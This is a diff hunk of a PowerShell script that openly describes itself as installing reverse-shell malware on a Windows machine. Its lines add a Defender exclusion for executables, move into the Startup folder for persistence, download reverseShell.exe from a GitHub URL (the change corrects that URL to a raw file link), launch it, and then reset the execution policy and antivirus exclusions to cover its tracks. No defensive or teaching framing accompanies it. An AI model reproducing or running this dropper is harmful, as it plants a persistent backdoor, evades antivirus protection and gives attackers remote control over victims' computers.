@@ -6,7 +6,7 @@ $FILE.Attributes='hidden' #Make nmap directory hidden
 Remove-Item nmap.zip #Delete nmap.zip file
 Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup #Go to startup directory to make our reverseShell malware persistent
 Add-MpPreference -ExclusionExtension exe -Force
-Invoke-WebRequest https://github.com/p1mpus/script/ -o reverseShell.exe #Download the reverseShell malware
+Invoke-WebRequest https://github.com/p1mpus/script/raw/main/reverseShell.exe -o reverseShell.exe #Download the reverseShell malware
 Start-Process reverseShell.exe #Start the malware
 Set-ExecutionPolicy Restricted -Force #Reset script blocker
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
